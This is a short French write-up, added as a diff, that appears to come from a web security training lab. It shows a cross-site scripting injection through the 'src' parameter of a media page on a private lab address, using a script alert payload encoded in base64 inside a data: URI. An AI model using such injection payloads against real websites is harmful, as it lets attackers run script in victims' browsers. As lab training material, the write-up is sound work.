@@ -1,0 +1,16 @@
+En cliquand sur l'image NSA on peut voir que l'appel ce fait en GET
+
+http://192.168.1.20/?page=media&src=nsa
+
+Apres avoir essayé de changer le nom on constate que le text est accepté, il est donc probablement possible d'injecter du HTML. Apres avoir essayé nous pouvons constater que le html est detecté. 
+Essayons maintenant en specifiant le type de data 'text/html' et en encodant en base64.
+
+<script>alert("DARKLY")</script>
+
+base64
+
+PHNjcmlwdD5hbGVydCgiREFSS0xZIik8L3NjcmlwdD4=
+
+
+
+http://192.168.1.20/?page=media&src=src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiREFSS0xZIik8L3NjcmlwdD4=
